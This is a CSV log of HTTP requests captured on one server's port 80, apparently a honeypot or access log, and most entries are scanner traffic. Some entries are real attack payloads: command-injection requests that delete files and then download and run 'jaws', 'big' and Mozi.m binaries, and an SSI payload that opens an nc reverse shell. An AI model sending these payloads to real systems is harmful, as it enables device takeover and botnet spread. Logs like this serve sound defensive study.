ID,ADDR,VALUE,TIME
REQ_212_P80,"('54.86.50.139', 64878)","b'GET /config/getuser?index=0 HTTP/1.1\r\nUser-Agent: PostmanRuntime/7.29.0\r\nAccept: */*\r\nCache-Control: no-cache\r\nPostman-Token: 82a7d45c-4d6f-4809-a9fa-43ebee602422\r\nHost: 54.91.30.20:80\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n'",2022-05-12 09:41:59.754940
REQ_213_P80,"('127.0.0.1', 1160)","b'GET / HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\nsec-ch-ua: "" Not A;Brand"";v=""99"", ""Chromium"";v=""101"", ""Google Chrome"";v=""101""\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: ""Windows""\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nSec-Fetch-Site: none\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nSec-Fetch-Dest: document\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7\r\nCookie: username-localhost-8888=""2|1:0|10:1651652027|23:username-localhost-8888|44:NzllMWExMmE5MWJlNGYxOTlkNDFiMTQzYzJjNTczMDk=|535d63cfdd3e2f22b7f3b2633cf7e1d5377490669a1ace24b7787adbcf292c11""; _xsrf=2|9c288d4b|5cb79c30a0b57f9e20112daa56e9943d|1651652027\r\n\r\n'",2022-05-12 15:28:50.799109
REQ_214_P80,"('127.0.0.1', 1161)","b'GET /favicon.ico HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\nsec-ch-ua: "" Not A;Brand"";v=""99"", ""Chromium"";v=""101"", ""Google Chrome"";v=""101""\r\nsec-ch-ua-mobile: ?0\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36\r\nsec-ch-ua-platform: ""Windows""\r\nAccept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-Mode: no-cors\r\nSec-Fetch-Dest: image\r\nReferer: http://localhost/\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7\r\nCookie: username-localhost-8888=""2|1:0|10:1651652027|23:username-localhost-8888|44:NzllMWExMmE5MWJlNGYxOTlkNDFiMTQzYzJjNTczMDk=|535d63cfdd3e2f22b7f3b2633cf7e1d5377490669a1ace24b7787adbcf292c11""; _xsrf=2|9c288d4b|5cb79c30a0b57f9e20112daa56e9943d|1651652027\r\n\r\n'",2022-05-12 15:28:50.997902
REQ_215_P80,"('127.0.0.1', 1752)","b'GET / HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nsec-ch-ua: "" Not A;Brand"";v=""99"", ""Chromium"";v=""101"", ""Google Chrome"";v=""101""\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: ""Windows""\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nSec-Fetch-Site: none\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nSec-Fetch-Dest: document\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7\r\nCookie: username-localhost-8888=""2|1:0|10:1651652027|23:username-localhost-8888|44:NzllMWExMmE5MWJlNGYxOTlkNDFiMTQzYzJjNTczMDk=|535d63cfdd3e2f22b7f3b2633cf7e1d5377490669a1ace24b7787adbcf292c11""; _xsrf=2|9c288d4b|5cb79c30a0b57f9e20112daa56e9943d|1651652027\r\n\r\n'",2022-05-12 16:18:26.670042
REQ_216_P80,"('127.0.0.1', 1750)","b'GET /favicon.ico HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\nsec-ch-ua: "" Not A;Brand"";v=""99"", ""Chromium"";v=""101"", ""Google Chrome"";v=""101""\r\nsec-ch-ua-mobile: ?0\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36\r\nsec-ch-ua-platform: ""Windows""\r\nAccept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-Mode: no-cors\r\nSec-Fetch-Dest: image\r\nReferer: http://localhost/\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7\r\nCookie: username-localhost-8888=""2|1:0|10:1651652027|23:username-localhost-8888|44:NzllMWExMmE5MWJlNGYxOTlkNDFiMTQzYzJjNTczMDk=|535d63cfdd3e2f22b7f3b2633cf7e1d5377490669a1ace24b7787adbcf292c11""; _xsrf=2|9c288d4b|5cb79c30a0b57f9e20112daa56e9943d|1651652027\r\n\r\n'",2022-05-12 16:18:26.919762
REQ_217_P80,"('54.86.50.139', 13118)","b'GET / HTTP/1.1\r\nUser-Agent: PostmanRuntime/7.29.0\r\nAccept: */*\r\nCache-Control: no-cache\r\nPostman-Token: 4e2ee952-bdbb-432c-a266-40e0da1ad7a0\r\nHost: 54.91.30.20:80\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n'",2022-05-12 15:05:34.256218
REQ_218_P80,"('45.235.116.104', 51981)",b'GET / HTTP/1.1\r\n\r\n',2022-05-12 16:05:30.929656
REQ_219_P80,"('185.224.103.7', 59800)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:80\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\r\nContent-Length: 0\r\n\r\n'",2022-05-12 16:32:51.623858
REQ_220_P80,"('185.254.196.115', 59530)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-12 16:37:40.793601
REQ_221_P80,"('197.61.230.83', 43946)","b'GET /shell?cd+/tmp;rm+-rf+*;wget+jx.qingdaosheng.com/jaws;sh+/tmp/jaws HTTP/1.1\r\nUser-Agent: Hello, world\r\nHost: 127.0.0.1:80\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nConnection: keep-alive\r\n\r\n'",2022-05-12 16:41:12.251156
REQ_222_P80,"('197.61.230.83', 43949)",b'',2022-05-12 16:41:12.293573
REQ_223_P80,"('170.130.187.30', 62877)",b'GET / HTTP/1.0\r\nUser-Agent: https://gdnplus.com:Gather Analyze Provide.\r\nAccept: */*\r\n\r\n',2022-05-12 18:46:23.667303
REQ_224_P80,"('54.86.50.139', 25791)","b'GET / HTTP/1.1\r\nUser-Agent: PostmanRuntime/7.29.0\r\nAccept: */*\r\nCache-Control: no-cache\r\nPostman-Token: 571a5d8b-a4a6-4b5b-8478-d654038f0daa\r\nHost: 54.91.30.20:80\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n'",2022-05-12 19:29:59.548636
REQ_225_P80,"('185.254.196.115', 35722)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-12 19:38:08.688243
REQ_226_P80,"('54.86.50.139', 25334)","b'GET / HTTP/1.1\r\nUser-Agent: PostmanRuntime/7.29.0\r\nAccept: */*\r\nCache-Control: no-cache\r\nPostman-Token: 70b9649c-9e37-48a2-8ace-4f6265336679\r\nHost: 54.91.30.20:80\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n'",2022-05-12 21:53:39.794704
REQ_227_P80,"('54.86.50.139', 35048)","b'GET / HTTP/1.1\r\nUser-Agent: PostmanRuntime/7.29.0\r\nAccept: */*\r\nCache-Control: no-cache\r\nPostman-Token: 1e0f8e9b-c816-4175-a95f-4d32899033e6\r\nHost: 54.91.30.20:80\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n'",2022-05-12 21:53:48.797135
REQ_228_P80,"('41.157.234.21', 47229)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:80\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\r\nContent-Length: 0\r\n\r\n'",2022-05-12 22:11:35.662140
REQ_229_P80,"('159.138.238.132', 46134)","b'POST /mgmt/tm/util/bash HTTP/1.1\r\nAccept-Encoding: identity\r\nContent-Length: 106\r\nHost: 54.91.30.20:80\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36\r\nAuthorization: Basic YWRtaW46\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{""command"":""run"",""utilCmdArgs"":""-c wget -q http://106.246.224.219/big || curl http://106.246.224.219/big""}'",2022-05-12 22:43:13.431557
REQ_230_P80,"('205.210.31.9', 52301)","b""\x16\x03\x01\x00\xca\x01\x00\x00\xc6\x03\x03\xffr\x0e?r\x02\x04,Fu\xd6\x83x>~F\x01\xfd\x9f\x10\x82`\xb4\xdf\x18:d\xbduN3|\x00\x00h\xcc\x14\xcc\x13\xc0/\xc0+\xc00\xc0,\xc0\x11\xc0\x07\xc0'\xc0#\xc0\x13\xc0\t\xc0(\xc0$\xc0\x14\xc0\n\xcc\x15\x00\x9e\x00\x9f\x00g\x00k\x003\x009\x00\x9c\x00\x9d\x00\x05\x00\x04\x00<\x00=\x00/\x005\xc0\x12\x00\x16\x00\n\x00\x03\x00\x08\x00\x06\x00\x14\x00\x11\x00\x19\x00\x17\x002\xc0\x08\x00\x12\x00\x13\x00\x15\x008\x00@\x00f\x00j\x00\xa2\x00\xa3\x01\x00\x005\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00\n\x00\x08\x00\x06\x00\x17\x00\x18\x00\x19\x00\x0b\x00\x02\x01\x00\x00\r\x00\x0c\x00\n\x04\x01\x04\x03\x02\x01\x02\x03\x02\x02\xff\x01\x00\x01\x00\x00\x0f\x00\x01\x01""",2022-05-12 22:54:05.050690
REQ_231_P80,"('205.210.31.21', 54941)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:80\r\nUser-Agent: Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com\r\n\r\n'",2022-05-12 23:11:14.091816
REQ_232_P80,"('185.254.196.218', 45770)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-12 23:49:18.231836
REQ_233_P80,"('165.22.151.166', 42896)","b'POST /mgmt/tm/util/bash HTTP/1.1\r\nAccept-Encoding: identity\r\nContent-Length: 106\r\nAuthorization: Basic YWRtaW46\r\nConnection: close\r\nContent-Type: application/json\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36\r\nHost: 54.91.30.20:80\r\n\r\n{""command"":""run"",""utilCmdArgs"":""-c wget -q http://106.246.224.219/big || curl http://106.246.224.219/big""}'",2022-05-12 23:56:11.942035
REQ_234_P80,"('185.254.196.115', 43078)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-13 00:07:06.480626
REQ_235_P80,"('192.241.199.252', 40452)",b'MGLNDD_54.91.30.20_80\n',2022-05-13 01:35:58.023519
REQ_236_P80,"('185.254.196.115', 59354)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-13 01:36:59.669959
REQ_237_P80,"('193.118.53.202', 47376)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 \r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n'",2022-05-13 01:43:50.992542
REQ_238_P80,"('183.245.138.167', 40993)","b'GET /shell?cd+/tmp;rm+-rf+*;wget+v1.kannimanelaji.com/jaws;sh+/tmp/jaws HTTP/1.1\r\nUser-Agent: Hello, world\r\nHost: 127.0.0.1:80\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nConnection: keep-alive\r\n\r\n'",2022-05-13 07:34:44.866178
REQ_239_P80,"('163.172.88.201', 51678)","b'GET ///.env HTTP/1.1\r\nHost: 54.91.30.20\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-1160.62.1.el7.x86_64\r\n\r\n'",2022-05-13 09:44:23.265137
REQ_240_P80,"('192.241.219.243', 34240)",b'GET /portal/redlion HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-Agent: Mozilla/5.0 zgrab/0.x\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n',2022-05-13 09:57:07.679294
REQ_241_P80,"('157.245.70.127', 39456)",b'GET /ab2g HTTP/1.1\r\n\r\n',2022-05-13 09:59:33.256416
REQ_242_P80,"('157.245.70.127', 39670)",b'GET /ab2h HTTP/1.1\r\n\r\n',2022-05-13 09:59:33.442744
REQ_243_P80,"('198.199.117.136', 33102)",b'GET /actuator/health HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-Agent: Mozilla/5.0 zgrab/0.x\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n',2022-05-13 10:04:47.969353
REQ_244_P80,"('192.241.222.11', 51478)",b'GET /hudson HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-Agent: Mozilla/5.0 zgrab/0.x\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n',2022-05-13 10:30:30.114513
REQ_245_P80,"('197.246.206.2', 46483)","b'GET /shell?cd+/tmp;rm+-rf+*;wget+jx.qingdaosheng.com/jaws;sh+/tmp/jaws HTTP/1.1\r\nUser-Agent: Hello, world\r\nHost: 127.0.0.1:80\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nConnection: keep-alive\r\n\r\n'",2022-05-13 10:37:03.120203
REQ_246_P80,"('197.246.206.2', 46487)",b'',2022-05-13 10:37:03.268302
REQ_247_P80,"('185.254.196.115', 60398)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-13 10:37:26.108293
REQ_248_P80,"('139.162.215.70', 39954)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 \r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n'",2022-05-13 11:03:33.687288
REQ_249_P80,"('185.254.196.218', 59674)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-13 11:52:26.110776
REQ_250_P80,"('185.254.196.115', 54836)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-13 12:07:41.244235
REQ_251_P80,"('137.184.122.128', 60838)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\n\r\n'",2022-05-13 12:25:13.463270
REQ_252_P80,"('64.62.197.2', 28352)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20\r\n\r\n',2022-05-13 12:50:11.044739
REQ_253_P80,"('173.249.2.195', 33650)","b'GET /shell?cd+/tmp;rm+-rf+*;wget+141.95.84.78/jaws;sh+/tmp/jaws HTTP/1.1\r\nUser-Agent: Hello, world\r\nHost: 127.0.0.1:80\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nConnection: keep-alive\r\n\r\n'",2022-05-13 13:00:12.444634
REQ_254_P80,"('173.249.2.195', 33684)",b'',2022-05-13 13:00:12.543814
REQ_255_P80,"('115.50.95.88', 36842)","b'POST /HNAP1/ HTTP/1.0\r\nHost: 54.91.30.20:80\r\nContent-Type: text/xml; charset=""utf-8""\r\nSOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://115.50.95.88:45813/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`\r\nContent-Length: 640\r\n\r\n<?xml version=""1.0"" encoding=""utf-8""?><soap:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/""><soap:Body><AddPortMapping xmlns=""http://purenetworks.com/HNAP1/""><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMappingProtocol>TCP</PortMappingProtocol><ExternalPort>1234</ExternalPort><InternalPort>1234</InternalPort></AddPortMapping></soap:Body></soap:Envelope>\r\n\r\n'",2022-05-13 23:37:09.179688
REQ_256_P80,"('185.254.196.218', 59914)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-13 23:48:49.125325
REQ_257_P80,"('185.142.236.40', 58990)","b'GET / HTTP/1.1\r\nAccept-Encoding: identity\r\nHost: 54.91.30.20\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\r\n\r\n'",2022-05-13 23:55:57.893608
REQ_258_P80,"('185.142.236.40', 59484)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20\r\n\r\n',2022-05-13 23:55:58.402803
REQ_259_P80,"('130.211.54.158', 49152)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-Agent: python-requests/2.27.1\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nx-datadog-trace-id: 1543831490169270950\r\nx-datadog-parent-id: 8499441001616741411\r\nx-datadog-sampling-priority: 0\r\n\r\n'",2022-05-13 23:56:03.099901
REQ_260_P80,"('185.254.196.115', 48980)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-14 00:05:25.042968
REQ_261_P80,"('109.248.6.126', 55619)",b'GET / HTTP/1.0\r\nUser-Agent: masscan-ng/1.3 (https://github.com/bi-zone/masscan-ng)\r\nAccept: */*\r\n\r\n',2022-05-14 00:32:39.337912
REQ_262_P80,"('185.254.196.115', 55268)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-14 01:37:09.350905
REQ_263_P80,"('185.254.196.115', 58508)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-16 15:04:12.853969
REQ_264_P80,"('40.82.192.115', 49889)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\n\r\n'",2022-05-16 15:08:51.666725
REQ_265_P80,"('174.96.157.246', 56034)",b'',2022-05-16 15:44:53.793790
REQ_266_P80,"('174.96.157.246', 56036)",b'GET / HTTP/1.1\r\nhost: 54.91.30.20\r\n\r\n',2022-05-16 15:44:53.865583
REQ_267_P80,"('169.239.69.16', 45995)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:80\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\r\nContent-Length: 0\r\n\r\n'",2022-05-16 15:56:00.598638
REQ_268_P80,"('45.148.10.81', 36246)",b'GET /incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22mkfifo%20/tmp/s;nc%20-w%205%20193.124.7.9%2031337%200%3C/tmp/s|/bin/sh%3E/tmp/s%202%3E/tmp/s;rm%20/tmp/s%22%20--%3e HTTP/1.0\n\n',2022-05-16 16:21:30.194697
REQ_269_P80,"('185.254.196.115', 59358)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-16 16:35:35.174886
REQ_270_P80,"('185.254.196.218', 36892)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-16 17:51:25.137075
REQ_271_P80,"('185.254.196.115', 40692)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-16 18:06:56.850234
REQ_272_P80,"('143.244.181.54', 61953)",b'GET / HTTP/1.0\r\n\r\n',2022-05-16 18:09:02.686373
REQ_273_P80,"('143.110.255.56', 25902)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20\r\nAccept: */*\r\nAccept-Charset: UTF-8\r\nAccept-Encoding: UTF-8\r\nAccept-Language: *\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0\r\n\r\n',2022-05-16 18:32:04.336635
REQ_274_P80,"('161.35.230.3', 51200)",b'\x00\x0e8xs\x81\x17\xfc\xd2\x1b\x99\x00\x00\x00\x00\x00',2022-05-16 19:01:53.983390
REQ_275_P80,"('82.151.125.235', 8213)","b'POST /HNAP1/ HTTP/1.0\r\nHost: 54.91.30.20:80\r\nContent-Type: text/xml; charset=""utf-8""\r\nSOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://82.151.125.235:42963/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`\r\nContent-Length: 640\r\n\r\n<?xml version=""1.0"" encoding=""utf-8""?><soap:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/""><soap:Body><AddPortMapping xmlns=""http://purenetworks.com/HNAP1/""><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMappingProtocol>TCP</PortMappingProtocol><ExternalPort>1234</ExternalPort><InternalPort>1234</InternalPort></AddPortMapping></soap:Body></soap:Envelope>\r\n\r\n'",2022-05-16 19:07:34.422937
REQ_276_P80,"('34.234.90.160', 17287)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20:80\r\nUser-Agent: Go-http-client/1.1\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n',2022-05-16 19:28:47.893581
REQ_277_P80,"('185.173.35.13', 55042)",b'GET / HTTP/1.0\r\nUser-Agent: NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com\r\nAccept: */*\r\n\r\n',2022-05-16 19:32:47.092659
